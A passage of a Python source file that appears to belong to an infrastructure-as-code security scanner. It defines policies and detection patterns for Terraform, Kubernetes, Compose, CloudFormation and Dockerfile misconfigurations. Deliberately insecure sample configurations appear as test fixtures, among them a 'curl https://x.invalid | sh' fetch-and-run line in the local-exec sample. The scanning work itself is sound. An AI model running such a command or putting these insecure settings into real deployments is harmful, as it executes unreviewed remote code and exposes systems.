        id="POLICY.IAC.KEY_ROTATION.AWS_KMS_KEY.001",
        title="aws_kms_key: automatic key rotation is not enabled",
        message=(
            "Rotation is off, so one key protects every object encrypted with it for "
            "the life of the account. A compromised key stays useful for as long as "
            "the data does."
        ),
        remediation="Set `enable_key_rotation = true`.",
        severity=_MEDIUM,
        confidence=Confidence.HIGH,
        category=Category.POLICY,
        resources=("aws_kms_key",),
        require=(r"enable_key_rotation\s*=\s*true",),
        bad='  description = "example"\n',
        good='  description = "example"\n  enable_key_rotation = true\n',
    ),
    IacPolicy(
        id="POLICY.IAC.KEY_ROTATION.GOOGLE_KMS_CRYPTO_KEY.001",
        title="google_kms_crypto_key: no rotation period is set",
        message=(
            "Without `rotation_period` the key never rotates, so its exposure window "
            "is the lifetime of the project."
        ),
        remediation="Set `rotation_period` to the interval your policy requires.",
        severity=_MEDIUM,
        confidence=Confidence.MEDIUM,
        category=Category.POLICY,
        resources=("google_kms_crypto_key",),
        require=(r"rotation_period\s*=",),
        bad='  name = "example"\n',
        good='  name = "example"\n  rotation_period = "7776000s"\n',
    ),
    IacPolicy(
        id="POLICY.IAC.MUTABLE_TAGS.AWS_ECR_REPOSITORY.001",
        title="aws_ecr_repository: image tags are mutable",
        message=(
            '`image_tag_mutability = "MUTABLE"` lets a tag be moved to a different '
            "image after it is deployed, so what a manifest pins by tag is not what "
            "was reviewed."
        ),
        remediation='Set `image_tag_mutability = "IMMUTABLE"` and deploy by digest.',
        severity=_MEDIUM,
        confidence=Confidence.HIGH,
        category=Category.POLICY,
        resources=("aws_ecr_repository",),
        forbid=(r"image_tag_mutability\s*=\s*\"MUTABLE\"",),
        bad='  name = "example"\n  image_tag_mutability = "MUTABLE"\n',
        good='  name = "example"\n  image_tag_mutability = "IMMUTABLE"\n',
    ),
    IacPolicy(
        id="POLICY.IAC.SCAN_ON_PUSH.AWS_ECR_REPOSITORY.001",
        title="aws_ecr_repository: images are not scanned on push",
        message=(
            "Nothing examines an image as it enters the registry, so a vulnerable or "
            "malicious layer is first noticed wherever it is deployed."
        ),
        remediation="Enable `scan_on_push` in the image_scanning_configuration block.",
        severity=_LOW,
        confidence=Confidence.MEDIUM,
        category=Category.POLICY,
        resources=("aws_ecr_repository",),
        require=(r"scan_on_push\s*=\s*true",),
        bad='  name = "example"\n',
        good='  name = "example"\n  image_scanning_configuration {\n    scan_on_push = true\n  }\n',
    ),
    IacPolicy(
        id="SUSPECT.IAC.PRIVILEGED_BUILD.AWS_CODEBUILD_PROJECT.001",
        title="aws_codebuild_project: the build runs privileged",
        message=(
            "`privileged_mode = true` gives the build container the host's full "
            "capabilities. Anything the build executes -- including a dependency's "
            "install script -- runs with them."
        ),
        remediation=(
            "Leave privileged mode off unless the build genuinely builds images, and "
            "then isolate that project from the ones that hold deployment credentials."
        ),
        severity=_MEDIUM,
        confidence=Confidence.HIGH,
        category=Category.SUSPICIOUS,
        resources=("aws_codebuild_project",),
        forbid=(r"privileged_mode\s*=\s*true",),
        bad='  name = "example"\n  environment {\n    privileged_mode = true\n  }\n',
        good='  name = "example"\n  environment {\n    privileged_mode = false\n  }\n',
    ),
    IacPolicy(
        id="SUSPECT.IAC.ROOT_ACCESS.AWS_SAGEMAKER_NOTEBOOK_INSTANCE.001",
        title="aws_sagemaker_notebook_instance: notebook users have root",
        message=(
            '`root_access = "Enabled"` gives every notebook user root on the '
            "instance, and with it the instance role's credentials."
        ),
        remediation='Set `root_access = "Disabled"`.',
        severity=_MEDIUM,
        confidence=Confidence.HIGH,
        category=Category.SUSPICIOUS,
        resources=("aws_sagemaker_notebook_instance",),
        forbid=(r"root_access\s*=\s*\"Enabled\"",),
        bad='  name = "example"\n  root_access = "Enabled"\n',
        good='  name = "example"\n  root_access = "Disabled"\n',
    ),
)


# ---------------------------------------------------------------------------
# Kubernetes workloads
# ---------------------------------------------------------------------------

#: Controls `detect/config_files.py` already reports on these same files.
#: `SUSPECT.IAC.PRIVILEGED.001` and `SUSPECT.IAC.HOST_MOUNT.001` fire on a
#: privileged container and a host mount wherever they appear, so building a
#: second policy for them would mean two findings about one line.
ALREADY_REPORTED = frozenset({"PRIVILEGED", "HOST_PATH", "DOCKER_SOCKET"})

_WORKLOAD_KINDS = (
    "k8s:Pod",
    "k8s:Deployment",
    "k8s:StatefulSet",
    "k8s:DaemonSet",
    "k8s:Job",
    "k8s:CronJob",
    "k8s:ReplicaSet",
    "k8s:ReplicationController",
)

_K8S: tuple[tuple[str, str, str, Severity, Category, str, str, str, str], ...] = (
    (
        "HOST_NETWORK",
        "hostNetwork",
        r"hostNetwork:\s*true",
        _HIGH,
        Category.SUSPICIOUS,
        "the pod shares the node's network namespace",
        "The pod sees and can bind every interface on the node, reach services that "
        "trust the node's address, and read traffic that was never meant to leave it. "
        "Network policy does not apply to it.",
        "Remove `hostNetwork: true`.",
        "hostNetwork",
    ),
    (
        "HOST_PID",
        "hostPID",
        r"hostPID:\s*true",
        _HIGH,
        Category.SUSPICIOUS,
        "the pod shares the node's process namespace",
        "The container sees every process on the node, can read their memory and "
        "environment -- where credentials live -- and can signal them.",
        "Remove `hostPID: true`.",
        "hostPID",
    ),
    (
        "HOST_IPC",
        "hostIPC",
        r"hostIPC:\s*true",
        _MEDIUM,
        Category.SUSPICIOUS,
        "the pod shares the node's IPC namespace",
        "Shared memory belonging to other workloads on the node is readable and "
        "writable from this one.",
        "Remove `hostIPC: true`.",
        "hostIPC",
    ),
    (
        "PRIVILEGED",
        "privileged",
        r"privileged:\s*true",
        _HIGH,
        Category.SUSPICIOUS,
        "a container runs privileged",
        "A privileged container has the node's full capability set and access to its "
        "devices. It is a container boundary in name only: escaping to the node is a "
        "documented one-liner.",
        "Remove `privileged: true` and grant the specific capabilities the workload needs.",
        "privileged",
    ),
    (
        "PRIVILEGE_ESCALATION",
        "allowPrivilegeEscalation",
        r"allowPrivilegeEscalation:\s*true",
        _MEDIUM,
        Category.SUSPICIOUS,
        "a container may gain more privileges than it started with",
        "A setuid binary or a file capability inside the image can raise the "
        "container's privileges at runtime, past whatever the manifest granted.",
        "Set `allowPrivilegeEscalation: false`.",
        "allowPrivilegeEscalation",
    ),
    (
        "RUN_AS_ROOT",
        "runAsUser",
        r"runAsUser:\s*0\b",
        _MEDIUM,
        Category.SUSPICIOUS,
        "a container runs as uid 0",
        "Root in the container is root on the node for every resource the container "
        "boundary does not cover, and it removes the last barrier after a container "
        "escape.",
        "Run as a non-zero uid and set `runAsNonRoot: true`.",
        "runAsUser",
    ),
    (
        "DANGEROUS_CAPABILITY",
        "capabilities",
        r"add:[\s\S]{0,60}?\b(?:SYS_ADMIN|NET_ADMIN|SYS_PTRACE|SYS_MODULE|DAC_READ_SEARCH|ALL)\b",
        _HIGH,
        Category.SUSPICIOUS,
        "a container is granted a capability that defeats isolation",
        "SYS_ADMIN, NET_ADMIN, SYS_PTRACE, SYS_MODULE and DAC_READ_SEARCH each "
        "provide a documented path out of the container or into another workload's "
        "memory.",
        "Drop ALL and add back only the capabilities the workload cannot run without.",
        "capabilities",
    ),
    (
        "WRITABLE_ROOT",
        "readOnlyRootFilesystem",
        r"readOnlyRootFilesystem:\s*false",
        _LOW,
        Category.POLICY,
        "the container's root filesystem is writable",
        "A writable root filesystem lets anything that executes in the container "
        "persist a payload for the life of the pod, and hides it from an image scan.",
        "Set `readOnlyRootFilesystem: true` and mount a volume for the paths that "
        "genuinely need writing.",
        "readOnlyRootFilesystem",
    ),
    (
        "LATEST_TAG",
        "image",
        r"image:\s*[^\s\"']+:latest\b",
        _MEDIUM,
        Category.POLICY,
        "a container image is pinned to :latest",
        "What runs is whatever that tag pointed at when the node last pulled, which "
        "is not recorded anywhere and differs between nodes.",
        "Pin the image by digest, or at least by an immutable version tag.",
        "image",
    ),
    (
        "AUTOMOUNT_TOKEN",
        "automountServiceAccountToken",
        r"automountServiceAccountToken:\s*true",
        _LOW,
        Category.POLICY,
        "the service account token is mounted into the pod",
        "Anything that executes in the pod can read the token and call the API server "
        "as the service account, which is the first step in most cluster-level "
        "escalations.",
        "Set `automountServiceAccountToken: false` for workloads that do not call the API server.",
        "automountServiceAccountToken",
    ),
    (
        "HOST_PATH",
        "hostPath",
        r"hostPath:",
        _HIGH,
        Category.SUSPICIOUS,
        "a host directory is mounted into the pod",
        "The container reads and writes the node's own filesystem. A mount of `/`, "
        "`/etc`, `/var/run` or the kubelet's directory is a direct path to the node "
        "and to every other pod's secrets.",
        "Use a volume type that does not reach the node, or restrict the path and "
        "mount it read-only.",
        "hostPath",
    ),
)


def _k8s_policies() -> list[IacPolicy]:
    policies: list[IacPolicy] = []
    for family, attribute, pattern, severity, category, subject, consequence, fix, sample in _K8S:
        if family in ALREADY_REPORTED:
            continue
        prefix = "SUSPECT" if category is Category.SUSPICIOUS else "POLICY"
        bad_value = {
            "capabilities": "        capabilities:\n          add: [SYS_ADMIN]\n",
            "readOnlyRootFilesystem": "        readOnlyRootFilesystem: false\n",
            "image": "      image: nginx:latest\n",
            "runAsUser": "        runAsUser: 0\n",
            "hostPath": "      volumes:\n        - hostPath:\n            path: /\n",
        }.get(sample, f"        {attribute}: true\n")
        good_value = {
            "capabilities": "        capabilities:\n          drop: [ALL]\n",
            "image": "      image: nginx@sha256:aaaa\n",
            "runAsUser": "        runAsUser: 1001\n",
            "hostPath": "      volumes:\n        - emptyDir: {}\n",
            "readOnlyRootFilesystem": "        readOnlyRootFilesystem: true\n",
        }.get(sample, f"        {attribute}: false\n")
        policies.append(
            IacPolicy(
                id=f"{prefix}.K8S.{family}.001",
                title=f"Kubernetes workload: {subject}",
                message=consequence,
                remediation=fix,
                severity=severity,
                confidence=Confidence.HIGH,
                category=category,
                resources=_WORKLOAD_KINDS,
                forbid=(pattern,),
                bad=f"kind: Pod\nmetadata:\n  name: example\nspec:\n  containers:\n    - name: app\n{bad_value}",
                good=f"kind: Pod\nmetadata:\n  name: example\nspec:\n  containers:\n    - name: app\n{good_value}",
            )
        )
    return policies


# ---------------------------------------------------------------------------
# Compose services
# ---------------------------------------------------------------------------

_COMPOSE: tuple[tuple[str, str, str, Severity, str, str, str, str], ...] = (
    (
        "PRIVILEGED",
        r"privileged:\s*true",
        "privileged: true",
        _HIGH,
        "the service runs privileged",
        "A privileged container has the host's capabilities and its devices. On a "
        "developer machine that is the machine; in a pipeline it is the runner.",
        "Remove `privileged: true`.",
        "privileged: false",
    ),
    (
        "DOCKER_SOCKET",
        r"/var/run/docker\.sock",
        "- /var/run/docker.sock:/var/run/docker.sock",
        _HIGH,
        "the Docker socket is mounted into the service",
        "Access to the daemon socket is equivalent to root on the host: a container "
        "with it can start another container that mounts the host filesystem.",
        "Do not mount the socket. If the service must orchestrate containers, give it "
        "a scoped API proxy instead.",
        "- ./data:/data",
    ),
    (
        "HOST_NETWORK",
        r"network_mode:\s*[\"']?host",
        "network_mode: host",
        _MEDIUM,
        "the service shares the host network namespace",
        "The container binds and reads the host's interfaces directly, so published "
        "ports and network isolation both stop applying.",
        "Use the default bridge network and publish the ports the service needs.",
        "network_mode: bridge",
    ),
    (
        "DANGEROUS_CAPABILITY",
        r"cap_add:[\s\S]{0,60}?\b(?:SYS_ADMIN|NET_ADMIN|SYS_PTRACE|SYS_MODULE|ALL)\b",
        "cap_add:\n      - SYS_ADMIN",
        _HIGH,
        "the service is granted a capability that defeats isolation",
        "SYS_ADMIN and its neighbours each provide a documented path out of the container.",
        "Drop all capabilities and add back only what the service cannot run without.",
        "cap_drop:\n      - ALL",
    ),
)


def _compose_policies() -> list[IacPolicy]:
    policies: list[IacPolicy] = []
    for family, pattern, bad_line, severity, subject, consequence, fix, good_line in _COMPOSE:
        if family in ALREADY_REPORTED:
            continue
        policies.append(
            IacPolicy(
                id=f"SUSPECT.COMPOSE.{family}.001",
                title=f"Compose service: {subject}",
                message=consequence,
                remediation=fix,
                severity=severity,
                confidence=Confidence.HIGH,
                category=Category.SUSPICIOUS,
                resources=("compose:service",),
                forbid=(pattern,),
                bad=f"  app:\n    image: example\n    {bad_line}\n",
                good=f"  app:\n    image: example\n    {good_line}\n",
            )
        )
    return policies


# ---------------------------------------------------------------------------
# CloudFormation, where the same controls are written differently
# ---------------------------------------------------------------------------

_CFN: tuple[tuple[str, str, str, Severity, Category, str, str, str, str, str], ...] = (
    (
        "PUBLIC_STORAGE",
        "cfn:AWS::S3::Bucket",
        r"AccessControl\"?:\s*Public(?:Read|ReadWrite)",
        _HIGH,
        Category.SUSPICIOUS,
        "the bucket is readable by anyone",
        "An `AccessControl` of PublicRead or PublicReadWrite grants the whole "
        "internet access to the objects in this bucket.",
        "Remove the public ACL and serve public content through a CDN origin identity.",
        "    Type: AWS::S3::Bucket\n    Properties:\n      AccessControl: PublicRead\n",
        "    Type: AWS::S3::Bucket\n    Properties:\n      AccessControl: Private\n",
    ),
    (
        "PUBLIC_ACCESS",
        "cfn:AWS::RDS::DBInstance",
        r"PubliclyAccessible\"?:\s*(?:true|'true'|\"true\")",
        _HIGH,
        Category.SUSPICIOUS,
        "the database is reachable from the public internet",
        "`PubliclyAccessible: true` gives the instance a public address, leaving its "
        "own authentication as the only control in front of the data.",
        "Set `PubliclyAccessible: false` and reach it from inside the VPC.",
        "    Type: AWS::RDS::DBInstance\n    Properties:\n      PubliclyAccessible: true\n",
        "    Type: AWS::RDS::DBInstance\n    Properties:\n      PubliclyAccessible: false\n",
    ),
    (
        "ENCRYPT_AT_REST",
        "cfn:AWS::RDS::DBInstance",
        r"StorageEncrypted\"?:\s*(?:false|'false'|\"false\")",
        _HIGH,
        Category.POLICY,
        "storage encryption is switched off",
        "`StorageEncrypted: false` stores the database unencrypted, so a snapshot "
        "copied elsewhere is readable directly.",
        "Set `StorageEncrypted: true`.",
        "    Type: AWS::RDS::DBInstance\n    Properties:\n      StorageEncrypted: false\n",
        "    Type: AWS::RDS::DBInstance\n    Properties:\n      StorageEncrypted: true\n",
    ),
    (
        "OPEN_INGRESS",
        "cfn:AWS::EC2::SecurityGroup",
        r"CidrIp\"?:\s*0\.0\.0\.0/0",
        _HIGH,
        Category.SUSPICIOUS,
        "a security group admits the whole internet",
        "An ingress rule with `CidrIp: 0.0.0.0/0` opens the port to every address on "
        "the internet, which is scanned continuously.",
        "Narrow the CIDR to the networks that need it, or front the service with a load balancer.",
        "    Type: AWS::EC2::SecurityGroup\n    Properties:\n      SecurityGroupIngress:\n        - CidrIp: 0.0.0.0/0\n          FromPort: 22\n",
        "    Type: AWS::EC2::SecurityGroup\n    Properties:\n      SecurityGroupIngress:\n        - CidrIp: 10.0.0.0/8\n          FromPort: 22\n",
    ),
    (
        "IAM_WILDCARD",
        "cfn:AWS::IAM::Policy",
        r"Action\"?:\s*(?:'\*'|\"\*\"|\*)\s*$",
        _HIGH,
        Category.SUSPICIOUS,
        "the policy grants every action",
        "`Action: '*'` grants every API call the service has. A credential holding it "
        "is equivalent to the account.",
        "Name the actions the principal needs.",
        "    Type: AWS::IAM::Policy\n    Properties:\n      PolicyDocument:\n        Statement:\n          - Effect: Allow\n            Action: '*'\n",
        "    Type: AWS::IAM::Policy\n    Properties:\n      PolicyDocument:\n        Statement:\n          - Effect: Allow\n            Action: s3:GetObject\n",
    ),
    (
        "ENCRYPT_AT_REST",
        "cfn:AWS::EFS::FileSystem",
        r"Encrypted\"?:\s*(?:false|'false'|\"false\")",
        _MEDIUM,
        Category.POLICY,
        "the file system is not encrypted",
        "`Encrypted: false` leaves every file readable to anything that reaches the "
        "underlying storage.",
        "Set `Encrypted: true`.",
        "    Type: AWS::EFS::FileSystem\n    Properties:\n      Encrypted: false\n",
        "    Type: AWS::EFS::FileSystem\n    Properties:\n      Encrypted: true\n",
    ),
    (
        "PLAINTEXT",
        "cfn:AWS::ElasticLoadBalancingV2::Listener",
        r"Protocol\"?:\s*HTTP\s*$",
        _MEDIUM,
        Category.SUSPICIOUS,
        "the listener serves plain HTTP",
        "Everything the listener carries is readable and modifiable on the path "
        "between the client and it.",
        "Serve HTTPS, keeping HTTP only to redirect.",
        "    Type: AWS::ElasticLoadBalancingV2::Listener\n    Properties:\n      Protocol: HTTP\n      Port: 80\n",
        "    Type: AWS::ElasticLoadBalancingV2::Listener\n    Properties:\n      Protocol: HTTPS\n      Port: 443\n",
    ),
)


def _cfn_policies() -> list[IacPolicy]:
    policies: list[IacPolicy] = []
    for (
        family,
        resource,
        pattern,
        severity,
        category,
        subject,
        consequence,
        fix,
        bad,
        good,
    ) in _CFN:
        prefix = "SUSPECT" if category is Category.SUSPICIOUS else "POLICY"
        short = resource.split("::")[-1].upper()
        policies.append(
            IacPolicy(
                id=f"{prefix}.CFN.{family}.{short}.001",
                title=f"{resource.removeprefix('cfn:')}: {subject}",
                message=consequence,
                remediation=fix,
                severity=severity,
                confidence=Confidence.HIGH,
                category=category,
                resources=(resource,),
                forbid=(pattern,),
                bad=bad,
                good=good,
            )
        )
    return policies


# ---------------------------------------------------------------------------
# More storage that defaults to plaintext
# ---------------------------------------------------------------------------

_AT_REST_EXTRA: tuple[tuple[str, str, Severity], ...] = (
    ("aws_sqs_queue", "kms_master_key_id", _MEDIUM),
    ("aws_sns_topic", "kms_master_key_id", _MEDIUM),
    ("aws_cloudwatch_log_group", "kms_key_id", _LOW),
    ("aws_kinesis_stream", "encryption_type", _MEDIUM),
    ("aws_kinesis_firehose_delivery_stream", "server_side_encryption", _MEDIUM),
    ("aws_athena_workgroup", "encryption_configuration", _MEDIUM),
    ("aws_athena_database", "encryption_configuration", _MEDIUM),
    ("aws_glue_catalog_database", "target_database", _LOW),
    ("aws_secretsmanager_secret", "kms_key_id", _LOW),
    ("aws_ssm_parameter", "key_id", _LOW),
    ("aws_lambda_function", "kms_key_arn", _LOW),
    ("aws_cloudtrail", "kms_key_id", _MEDIUM),
    ("aws_elasticsearch_domain", "encrypt_at_rest", _HIGH),
    ("aws_opensearch_domain", "encrypt_at_rest", _HIGH),
    ("aws_memorydb_cluster", "kms_key_arn", _MEDIUM),
    ("aws_mq_broker", "encryption_options", _MEDIUM),
    ("aws_transfer_server", "post_authentication_login_banner", _LOW),
    ("google_pubsub_topic", "kms_key_name", _LOW),
    ("google_spanner_database", "encryption_config", _LOW),
    ("google_bigtable_instance", "cluster", _LOW),
    ("google_container_cluster", "database_encryption", _MEDIUM),
    ("azurerm_mssql_database", "transparent_data_encryption_enabled", _HIGH),
    ("azurerm_cosmosdb_account", "key_vault_key_id", _LOW),
    ("azurerm_eventhub_namespace", "local_authentication_enabled", _LOW),
    ("azurerm_storage_account", "infrastructure_encryption_enabled", _LOW),
)

# ---------------------------------------------------------------------------
# More places nothing is written down
# ---------------------------------------------------------------------------

_LOGGING_EXTRA: tuple[tuple[str, str, Severity], ...] = (
    ("aws_s3_bucket_logging", "target_bucket", _LOW),
    ("aws_cloudfront_distribution", "logging_config", _LOW),
    ("aws_lb", "access_logs", _LOW),
    ("aws_alb", "access_logs", _LOW),
    ("aws_api_gateway_stage", "access_log_settings", _LOW),
    ("aws_apigatewayv2_stage", "access_log_settings", _LOW),
    ("aws_eks_cluster", "enabled_cluster_log_types", _MEDIUM),
    ("aws_mq_broker", "logs", _LOW),
    ("aws_globalaccelerator_accelerator", "attributes", _LOW),
    ("aws_lambda_function", "tracing_config", _LOW),
    ("aws_vpc", "enable_dns_hostnames", _LOW),
    ("google_compute_subnetwork", "log_config", _LOW),
    ("google_container_cluster", "monitoring_service", _LOW),
    ("google_sql_database_instance", "backup_configuration", _MEDIUM),
    ("azurerm_kubernetes_cluster", "oms_agent", _LOW),
    ("azurerm_key_vault", "soft_delete_retention_days", _LOW),
)

# ---------------------------------------------------------------------------
# Runtimes the platform has stopped patching
# ---------------------------------------------------------------------------
#
# A deprecated runtime does not fail a deployment -- it stops receiving security
# updates, which is the same exposure as an unpatched base image and is visible
# in one line of the configuration.

_DEPRECATED_RUNTIMES: tuple[tuple[str, str, str, Severity, str, str], ...] = (
    (
        "aws_lambda_function",
        "runtime",
        r"runtime\s*=\s*\"(?:nodejs(?:|4\.3|6\.10|8\.10|10\.x|12\.x|14\.x|16\.x)"
        r"|python(?:2\.7|3\.6|3\.7|3\.8)|ruby2\.[57]|dotnetcore[0-9.]*|go1\.x)\"",
        _MEDIUM,
        '  function_name = "example"\n  runtime = "python3.8"\n',
        '  function_name = "example"\n  runtime = "python3.12"\n',
    ),
    (
        "azurerm_linux_function_app",
        "python_version",
        r"python_version\s*=\s*\"3\.[678]\"",
        _MEDIUM,
        '  name = "example"\n  site_config {\n    application_stack {\n      python_version = "3.8"\n    }\n  }\n',
        '  name = "example"\n  site_config {\n    application_stack {\n      python_version = "3.12"\n    }\n  }\n',
    ),
    (
        "google_cloudfunctions_function",
        "runtime",
        r"runtime\s*=\s*\"(?:nodejs(?:6|8|10|12|14)|python3[67]|go11[13])\"",
        _MEDIUM,
        '  name = "example"\n  runtime = "python37"\n',
        '  name = "example"\n  runtime = "python312"\n',
    ),
    (
        "aws_elastic_beanstalk_environment",
        "solution_stack_name",
        r"solution_stack_name\s*=\s*\"[^\"]*(?:Node\.js 1[0-4]|Python 3\.[678]|PHP 7\.[0-4])",
        _MEDIUM,
        '  name = "example"\n  solution_stack_name = "64bit Amazon Linux 2 v5.4.0 running Python 3.7"\n',
        '  name = "example"\n  solution_stack_name = "64bit Amazon Linux 2023 v4.0.0 running Python 3.12"\n',
    ),
)


def _deprecated_runtime_policies() -> list[IacPolicy]:
    policies: list[IacPolicy] = []
    for resource, attribute, pattern, severity, bad, good in _DEPRECATED_RUNTIMES:
        policies.append(
            _forbid_value(
                family="DEPRECATED_RUNTIME",
                resource=resource,
                attribute=attribute,
                pattern=pattern,
                severity=severity,
                title=f"{resource}: the runtime is out of support",
                message=(
                    "This runtime no longer receives security updates from the "
                    "platform. Nothing fails, and the function keeps running on an "
                    "interpreter whose known vulnerabilities will not be fixed."
                ),
                remediation="Move to a supported runtime version.",
                bad=bad,
                good=good,
            )
        )
    return policies


# ---------------------------------------------------------------------------
# Terraform's own footguns
# ---------------------------------------------------------------------------

_TERRAFORM_HYGIENE: tuple[IacPolicy, ...] = (
    IacPolicy(
        id="SUSPECT.IAC.LOCAL_EXEC.TERRAFORM.001",
        title="A provisioner runs a shell command on the machine applying the plan",
        message=(
            "`local-exec` runs on whoever applies this -- a laptop, or the CI runner "
            "holding the cloud credentials. It is the one part of a plan that is not "
            "a description of infrastructure, and reviewing a plan does not show what "
            "it will do."
        ),
        remediation=(
            "Move the work into the pipeline where it is visible, or into a resource "
            "the provider models. If it must stay, keep the command in a reviewed "
            "script rather than inline."
        ),
        severity=_MEDIUM,
        confidence=Confidence.HIGH,
        category=Category.SUSPICIOUS,
        resources=("*",),
        forbid=(r"provisioner\s+\"local-exec\"",),
        bad='  name = "example"\n  provisioner "local-exec" {\n    command = "curl https://x.invalid | sh"\n  }\n',
        good='  name = "example"\n',
    ),
    IacPolicy(
        id="SUSPECT.IAC.CREDENTIALS_INLINE.TERRAFORM.001",
        title="A static credential is written into the configuration",
        message=(
            "An access key written into the configuration is committed, reviewed, "
            "cloned and backed up with it. It cannot be rotated without a code change "
            "and it is readable by everyone who can read the repository."
        ),
        remediation=(
            "Use the provider's environment variables, a shared credentials file, or "
            "workload identity."
        ),
        severity=_HIGH,
        confidence=Confidence.MEDIUM,
        category=Category.SUSPICIOUS,
        resources=("*",),
        forbid=(
            r"(?:access_key|secret_key|client_secret|password)\s*=\s*\"[A-Za-z0-9/+=_\-]{12,}\"",
        ),
        # A reference to a variable or a secret store is the remediation.
        unless=(r"=\s*\"?\$\{?var\.", r"=\s*var\.", r"=\s*data\.", r"=\s*local\."),
        bad='  name = "example"\n  secret_key = "wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY"\n',
        good='  name = "example"\n  secret_key = var.secret_key\n',
    ),
    IacPolicy(
        id="POLICY.IAC.UNENCRYPTED_STATE.TERRAFORM.001",
        title="The remote state backend does not require encryption",
        message=(
            "Terraform state holds every value the plan touched, including ones "
            "marked sensitive: passwords, keys, tokens, certificates. An unencrypted "
            "backend stores that in the clear."
        ),
        remediation="Set `encrypt = true` on the backend, and restrict who can read the bucket.",
        severity=_HIGH,
        confidence=Confidence.HIGH,
        category=Category.POLICY,
        resources=("backend:*",),
        forbid=(r"encrypt\s*=\s*false",),
        bad='  bucket = "state"\n  encrypt = false\n',
        good='  bucket = "state"\n  encrypt = true\n',
    ),
)


# ---------------------------------------------------------------------------
# Dockerfiles
# ---------------------------------------------------------------------------

_DOCKERFILE: tuple[tuple[str, str, str, Severity, Category, str, str, str, str, str], ...] = (
    (
        "ROOT_USER",
        "USER",
        r"(?m)^\s*USER\s+(?:root|0)\s*$",
        _MEDIUM,
        Category.POLICY,
        "the image runs as root",
        "Everything the container executes runs as uid 0. A container escape, a "
        "mounted volume or a shared kernel namespace then reaches the host as root, "
        "and nothing inside the image constrains it.",
        "Create a user and end the build with `USER app`.",
        'FROM debian:12\nUSER root\nCMD ["/app"]\n',
        'FROM debian:12\nRUN useradd -m app\nUSER app\nCMD ["/app"]\n',
    ),
    (
        "ADD_REMOTE",
        "ADD",
        r"(?m)^\s*ADD\s+https?://",
        _MEDIUM,
        Category.SUSPICIOUS,
        "the build downloads a URL with ADD",
        "`ADD` with a URL fetches whatever the host serves at build time, with no "
        "digest and no record of what arrived. `COPY` cannot do this, which is the "
        "reason to prefer it.",
        "Download in a `RUN` step that verifies a checksum, or vendor the file and COPY it.",
        "FROM debian:12\nADD https://example.invalid/tool.tar.gz /tmp/\n",
        "FROM debian:12\nCOPY tool.tar.gz /tmp/\n",
    ),
    (
        "SUDO",
        "RUN",
        r"(?m)^\s*RUN\s+[^\n]*\bsudo\b",
        _LOW,
        Category.POLICY,
        "the build uses sudo",
        "A build already runs as root unless told otherwise, so `sudo` in a Dockerfile "
        "means the image ships a setuid path that a compromised process inside it can "
        "use.",
        "Drop `sudo` and switch users with `USER` instead.",
        "FROM debian:12\nRUN sudo apt-get update\n",
        "FROM debian:12\nRUN apt-get update\n",
    ),
    (
        "SECRET_ARG",
        "ARG",
        r"(?mi)^\s*(?:ARG|ENV)\s+[A-Z_]*(?:PASSWORD|SECRET|TOKEN|API_KEY|ACCESS_KEY)[A-Z_]*\s*=?\s*\S+",
        _HIGH,
        Category.SUSPICIOUS,
        "a credential is baked into the image",
        "A value passed as ARG or set as ENV is recorded in the image's layer history "
        "and is readable by anyone who can pull the image, whether or not the final "
        "stage still uses it.",
        "Use a build secret mount (`RUN --mount=type=secret`) or inject the value at run time.",
        "FROM debian:12\nENV API_KEY=sk-live-aaaaaaaaaaaa\n",
        "FROM debian:12\nRUN --mount=type=secret,id=api_key cat /run/secrets/api_key\n",
    ),
    (
        "NO_HEALTHCHECK",
        "HEALTHCHECK",
        r"HEALTHCHECK",
        _LOW,
        Category.POLICY,
        "the image serves a port and declares no health check",
        "An orchestrator cannot tell a hung container from a working one, so a "
        "process that has stopped serving keeps receiving traffic.",
        "Add a `HEALTHCHECK` instruction that exercises the service rather than the process.",
        'FROM debian:12\nEXPOSE 8080\nCMD ["/app"]\n',
        'FROM debian:12\nEXPOSE 8080\nHEALTHCHECK CMD curl -f http://localhost/health\nCMD ["/app"]\n',
    ),
)


def _dockerfile_policies() -> list[IacPolicy]:
    policies: list[IacPolicy] = []
    for (
        family,
        _instruction,
        pattern,
        severity,
        category,
        subject,
        consequence,
        fix,
        bad,
        good,
    ) in _DOCKERFILE:
        prefix = "SUSPECT" if category is Category.SUSPICIOUS else "POLICY"
        # `NO_HEALTHCHECK` is the one that fires on absence; the rest fire on
        # something written down.
        absent = family == "NO_HEALTHCHECK"
        policies.append(
            IacPolicy(
                id=f"{prefix}.DOCKERFILE.{family}.001",
                title=f"Dockerfile: {subject}",
                message=consequence,
                remediation=fix,
                severity=severity,
                confidence=Confidence.HIGH,
                category=category,
                resources=("dockerfile",),
                forbid=() if absent else (pattern,),
                require=(pattern,) if absent else (),
                # A health check is about an image that serves something. A
                # command-line image has nothing to check, and requiring one of
                # it reports a control that would do nothing.
                when=(r"(?m)^\s*EXPOSE\s",) if family == "NO_HEALTHCHECK" else (),
                bad=bad,
                good=good,
            )
        )
    return policies


# ---------------------------------------------------------------------------
# More Kubernetes
# ---------------------------------------------------------------------------

_K8S_EXTRA: tuple[tuple[str, str, str, Severity, Category, str, str, str, str], ...] = (
    (
        "NO_RESOURCE_LIMITS",
        "limits",
        r"limits:",
        _LOW,
        Category.POLICY,
        "no resource limits are set",
        "A container with no limit can consume the node's whole CPU and memory. One "
        "workload -- or one runaway dependency inside it -- then evicts everything "
        "else scheduled there.",
        "Set `resources.limits` for cpu and memory.",
        "limits",
    ),
    (
        "DEFAULT_SERVICE_ACCOUNT",
        "serviceAccountName",
        r"serviceAccountName:",
        _LOW,
        Category.POLICY,
        "the workload uses the namespace's default service account",
        "The default account is shared by everything in the namespace, so a "
        "permission granted for one workload is granted to all of them.",
        "Create a service account for this workload and name it here.",
        "serviceAccountName",
    ),
    (
        "HOST_PORT",
        "hostPort",
        r"hostPort:\s*\d+",
        _MEDIUM,
        Category.SUSPICIOUS,
        "a container binds a port on the node",
        "A host port bypasses the Service layer and network policy, and it reserves "
        "that port on every node the pod can be scheduled to.",
        "Expose the container through a Service instead.",
        "hostPort",
    ),
    (
        "NO_RUN_AS_NON_ROOT",
        "runAsNonRoot",
        r"runAsNonRoot:\s*true",
        _MEDIUM,
        Category.POLICY,
        "nothing requires the container to run as a non-root user",
        "Without `runAsNonRoot: true` the kubelet accepts an image whose default user "
        "is root, so the manifest's intent depends on what the image happens to do.",
        "Set `runAsNonRoot: true` in the pod or container securityContext.",
        "runAsNonRoot",
    ),
    (
        "NO_SECCOMP",
        "seccompProfile",
        r"seccompProfile:",
        _LOW,
        Category.POLICY,
